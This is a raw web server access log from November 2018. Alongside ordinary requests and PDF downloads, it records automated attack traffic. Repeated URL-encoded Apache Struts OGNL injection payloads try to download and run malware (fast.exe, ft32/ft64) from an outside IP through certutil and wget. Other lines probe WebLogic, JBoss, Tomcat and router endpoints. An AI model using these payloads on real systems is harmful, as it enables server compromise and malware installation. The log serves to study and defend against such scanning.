184.105.247.252 - - [15/Nov/2018:00:02:39 +0000] "GET / HTTP/1.1" 200 10329
88.130.55.84 - - [15/Nov/2018:15:39:00 +0000] "GET /files/15cf72da-2687-40e7-9b4d-c273d3bb6eb2.pdf HTTP/1.1" 206 1245184
88.130.55.84 - - [15/Nov/2018:15:39:00 +0000] "GET /files/15cf72da-2687-40e7-9b4d-c273d3bb6eb2.pdf HTTP/1.1" 206 131072
88.130.55.84 - - [15/Nov/2018:15:40:03 +0000] "GET /%7B%7BgetPictureUrl()%7D%7D HTTP/1.1" 404 10329
88.130.55.84 - - [15/Nov/2018:15:40:03 +0000] "GET /%7B%7BgetPictureUrl()%7D%7D HTTP/1.1" 404 10329
88.130.55.84 - - [15/Nov/2018:15:40:03 +0000] "GET /cacheclearer HTTP/1.1" 302 -
88.130.55.84 - - [15/Nov/2018:15:40:03 +0000] "GET /api/config HTTP/1.1" 200 289
88.130.55.84 - - [15/Nov/2018:15:40:03 +0000] "GET /cacheclearer/ HTTP/1.1" 200 81515
88.130.55.84 - - [15/Nov/2018:15:40:03 +0000] "GET /favicon.ico HTTP/1.1" 404 10329
88.130.55.84 - - [15/Nov/2018:15:40:03 +0000] "GET /favicon.ico HTTP/1.1" 404 10329
88.130.55.84 - - [15/Nov/2018:15:40:07 +0000] "POST /upload/xlsx HTTP/1.1" 200 47
88.130.55.84 - - [15/Nov/2018:15:40:08 +0000] "POST /api/pdf HTTP/1.1" 200 394
88.130.55.84 - - [15/Nov/2018:15:40:09 +0000] "GET /api/pdf HTTP/1.1" 200 997
88.130.55.84 - - [15/Nov/2018:15:40:11 +0000] "GET /files/1aadd199-5f51-4af9-974f-49d27dc9ae7c.pdf HTTP/1.1" 200 3781974
88.130.55.84 - - [15/Nov/2018:15:40:11 +0000] "GET /files/1aadd199-5f51-4af9-974f-49d27dc9ae7c.pdf HTTP/1.1" 206 65536
88.130.55.84 - - [15/Nov/2018:15:40:11 +0000] "GET /files/1aadd199-5f51-4af9-974f-49d27dc9ae7c.pdf HTTP/1.1" 206 46422
88.130.55.84 - - [15/Nov/2018:15:40:11 +0000] "GET /files/1aadd199-5f51-4af9-974f-49d27dc9ae7c.pdf HTTP/1.1" 206 65536
88.130.55.84 - - [15/Nov/2018:15:40:11 +0000] "GET /files/1aadd199-5f51-4af9-974f-49d27dc9ae7c.pdf HTTP/1.1" 206 2359296
88.130.55.84 - - [15/Nov/2018:15:40:11 +0000] "GET /files/1aadd199-5f51-4af9-974f-49d27dc9ae7c.pdf HTTP/1.1" 206 131072
138.118.100.208 - - [15/Nov/2018:16:24:13 +0000] "GET / HTTP/1.1" 200 10329
60.191.38.77 - - [15/Nov/2018:16:57:59 +0000] "GET / HTTP/1.1" 200 10329
95.213.177.123 - - [15/Nov/2018:17:45:02 +0000] "POST /azenv.php?auth=154230390291&a=PSCMN&i=2783161885&p=8080 HTTP/1.1" 404 10329
183.90.58.76 - - [15/Nov/2018:18:20:26 +0000] "GET / HTTP/1.0" 200 10329
165.227.27.204 - - [15/Nov/2018:18:47:27 +0000] "GET / HTTP/1.1" 200 10329
165.227.27.204 - - [15/Nov/2018:18:47:28 +0000] "GET /ws_utc/resources/setting/options/general HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:18:47:28 +0000] "POST / HTTP/1.1" 200 10329
165.227.27.204 - - [15/Nov/2018:18:47:28 +0000] "POST / HTTP/1.1" 200 10329
165.227.27.204 - - [15/Nov/2018:18:47:29 +0000] "POST / HTTP/1.1" 200 10329
165.227.27.204 - - [15/Nov/2018:18:47:29 +0000] "POST / HTTP/1.1" 200 10329
165.227.27.204 - - [15/Nov/2018:18:47:29 +0000] "GET /%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27certutil.exe%20-urlcache%20-split%20-f%20http://111.90.158.225/d/fast.exe%20c:/fast.exe&cmd.exe%20/c%20c:%5C%5Cfast.exe%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action HTTP/1.1" 400 -
165.227.27.204 - - [15/Nov/2018:18:47:29 +0000] "GET /%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27certutil.exe%20-urlcache%20-split%20-f%20http://111.90.158.225/d/fast.exe%20c:/fast.exe&cmd.exe%20/c%20c:%5C%5Cfast.exe%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action HTTP/1.1" 400 -
165.227.27.204 - - [15/Nov/2018:18:47:30 +0000] "GET /%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27uname%20--m%7Cgrep%20x86_64%20%3E%3E%20/dev/null%20%7C%7C%20(pkill%20loop%20&&%20wget%20-O%20.loop%20http://111.90.158.225/d/ft32%20&&%20chmod%20777%20.loop%20&&%20./.loop)&&(pkill%20loop%20&&%20wget%20-O%20.loop%20http://111.90.158.225/d/ft64%20&&%20chmod%20777%20.loop%20&&%20./.loop)%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:18:47:30 +0000] "GET /%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27uname%20--m%7Cgrep%20x86_64%20%3E%3E%20/dev/null%20%7C%7C%20(pkill%20loop%20&&%20wget%20-O%20.loop%20http://111.90.158.225/d/ft32%20&&%20chmod%20777%20.loop%20&&%20./.loop)&&(pkill%20loop%20&&%20wget%20-O%20.loop%20http://111.90.158.225/d/ft64%20&&%20chmod%20777%20.loop%20&&%20./.loop)%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:18:47:30 +0000] "GET /invoker/readonly HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:18:47:31 +0000] "GET /invoker/JMXInvokerServlet HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:18:47:31 +0000] "GET /jmx-console/HtmlAdaptor HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:18:47:31 +0000] "GET /orders.xhtml HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:18:47:32 +0000] "GET / HTTP/1.1" 200 10329
165.227.27.204 - - [15/Nov/2018:18:47:32 +0000] "GET /users HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:18:47:32 +0000] "PUT /dba_put1.jsp/ HTTP/1.1" 404 -
165.227.27.204 - - [15/Nov/2018:18:47:33 +0000] "GET /dba_put1.jsp HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:18:47:33 +0000] "GET /manager/html HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:18:47:33 +0000] "GET /wls-wsat/CoordinatorPortType HTTP/1.1" 404 10329
179.99.175.76 - - [15/Nov/2018:19:08:21 +0000] "GET / HTTP/1.1" 200 10329
179.99.175.76 - - [15/Nov/2018:19:08:21 +0000] "GET / HTTP/1.1" 200 10329
186.208.24.168 - - [15/Nov/2018:19:24:54 +0000] "GET / HTTP/1.1" 200 10329
46.159.173.169 - - [15/Nov/2018:20:00:01 +0000] "GET / HTTP/1.1" 200 10329
40.68.193.165 - - [15/Nov/2018:20:59:40 +0000] "GET / HTTP/1.1" 200 10329
201.241.92.251 - - [15/Nov/2018:21:29:24 +0000] "GET / HTTP/1.1" 200 10329
217.61.99.154 - - [15/Nov/2018:21:44:01 +0000] "CONNECT www.google.com:443 HTTP/1.1" 400 -
111.65.184.9 - - [15/Nov/2018:22:03:36 +0000] "POST /tmUnblock.cgi HTTP/1.1" 404 10329
95.213.177.124 - - [15/Nov/2018:22:27:17 +0000] "POST /azenv.php?auth=154232083799&a=PSCMN&i=2783161885&p=8080 HTTP/1.1" 404 10329
189.19.127.207 - - [15/Nov/2018:23:19:28 +0000] "GET / HTTP/1.1" 200 10329
165.227.27.204 - - [15/Nov/2018:23:27:15 +0000] "GET / HTTP/1.1" 200 10329
165.227.27.204 - - [15/Nov/2018:23:27:15 +0000] "GET /ws_utc/resources/setting/options/general HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:23:27:15 +0000] "POST / HTTP/1.1" 200 10329
165.227.27.204 - - [15/Nov/2018:23:27:16 +0000] "POST / HTTP/1.1" 200 10329
165.227.27.204 - - [15/Nov/2018:23:27:16 +0000] "POST / HTTP/1.1" 200 10329
165.227.27.204 - - [15/Nov/2018:23:27:16 +0000] "POST / HTTP/1.1" 200 10329
165.227.27.204 - - [15/Nov/2018:23:27:17 +0000] "GET /%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27certutil.exe%20-urlcache%20-split%20-f%20http://111.90.158.225/d/fast.exe%20c:/fast.exe&cmd.exe%20/c%20c:%5C%5Cfast.exe%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action HTTP/1.1" 400 -
165.227.27.204 - - [15/Nov/2018:23:27:17 +0000] "GET /%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27certutil.exe%20-urlcache%20-split%20-f%20http://111.90.158.225/d/fast.exe%20c:/fast.exe&cmd.exe%20/c%20c:%5C%5Cfast.exe%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action HTTP/1.1" 400 -
165.227.27.204 - - [15/Nov/2018:23:27:17 +0000] "GET /%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27uname%20--m%7Cgrep%20x86_64%20%3E%3E%20/dev/null%20%7C%7C%20(pkill%20loop%20&&%20wget%20-O%20.loop%20http://111.90.158.225/d/ft32%20&&%20chmod%20777%20.loop%20&&%20./.loop)&&(pkill%20loop%20&&%20wget%20-O%20.loop%20http://111.90.158.225/d/ft64%20&&%20chmod%20777%20.loop%20&&%20./.loop)%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:23:27:18 +0000] "GET /%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27uname%20--m%7Cgrep%20x86_64%20%3E%3E%20/dev/null%20%7C%7C%20(pkill%20loop%20&&%20wget%20-O%20.loop%20http://111.90.158.225/d/ft32%20&&%20chmod%20777%20.loop%20&&%20./.loop)&&(pkill%20loop%20&&%20wget%20-O%20.loop%20http://111.90.158.225/d/ft64%20&&%20chmod%20777%20.loop%20&&%20./.loop)%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:23:27:18 +0000] "GET /invoker/readonly HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:23:27:18 +0000] "GET /invoker/JMXInvokerServlet HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:23:27:18 +0000] "GET /jmx-console/HtmlAdaptor HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:23:27:19 +0000] "GET /orders.xhtml HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:23:27:19 +0000] "GET / HTTP/1.1" 200 10329
165.227.27.204 - - [15/Nov/2018:23:27:19 +0000] "GET /users HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:23:27:20 +0000] "PUT /dba_put1.jsp/ HTTP/1.1" 404 -
165.227.27.204 - - [15/Nov/2018:23:27:20 +0000] "GET /dba_put1.jsp HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:23:27:20 +0000] "GET /manager/html HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:23:27:21 +0000] "GET /wls-wsat/CoordinatorPortType HTTP/1.1" 404 10329
